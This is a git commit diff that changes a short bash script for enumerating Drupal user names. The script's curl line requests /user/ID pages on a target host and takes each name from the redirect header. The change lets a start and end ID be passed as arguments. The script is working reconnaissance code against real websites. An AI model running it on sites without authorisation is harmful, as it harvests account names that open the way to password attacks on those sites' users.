f8951b1dbf7d6aaec8c0af5f39110e9d20f7eff4
SK ~ <45546882+sknux@users.noreply.github.com>
2022-03-01 20:58:49 -0300

    Update drupal-user-enum.sh

--- drupal-user-enum.sh
+++ drupal-user-enum.sh
@@ -2,15 +2,15 @@
 
 echo -e "Drupal User Enumeration By Redirect - Developed by sknux\n"
 
-i=1
+i=$2
 
 if [ -z "$1" ]
 then
-	echo -e "Usage: $0 Number-of-Attempts\nExample: $0 URL/IP 10."
+	echo -e "Usage: $0 Initial-Number-of-Attempts Final-Number-of-Attempts\nExample: $0 URL/IP 10 500."
 	exit
 fi
 
-while [ $i -le $2 ]
+while [ $i -le $3 ]
 do
 	echo 'The user of ID' $i 'is:'
 	curl -s --head https://$1/user/$i -k | grep Location | cut -d ' ' -f2 | cut -d '/' -f5
